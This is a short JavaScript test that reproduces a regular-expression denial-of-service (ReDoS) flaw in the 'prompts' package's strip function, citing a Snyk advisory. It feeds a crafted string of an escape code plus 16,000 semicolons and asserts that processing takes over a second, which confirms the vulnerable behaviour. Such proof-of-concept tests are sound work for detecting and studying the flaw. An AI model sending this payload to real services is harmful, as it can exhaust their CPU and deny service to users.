//https://security.snyk.io/vuln/SNYK-JS-PROMPTS-1729737
test("ReDos in prompts", () => {
  const measureTime = require("../utils").measureTime;
  const strip = require("prompts/lib/util/strip.js");

  let attack_str = "\u001B[" + ";".repeat(16000);

  let t = measureTime(function () {
    strip(attack_str);
  });

  let time = t[0] + t[1] / 1000000000;

  expect(time).toBeGreaterThan(1);
});
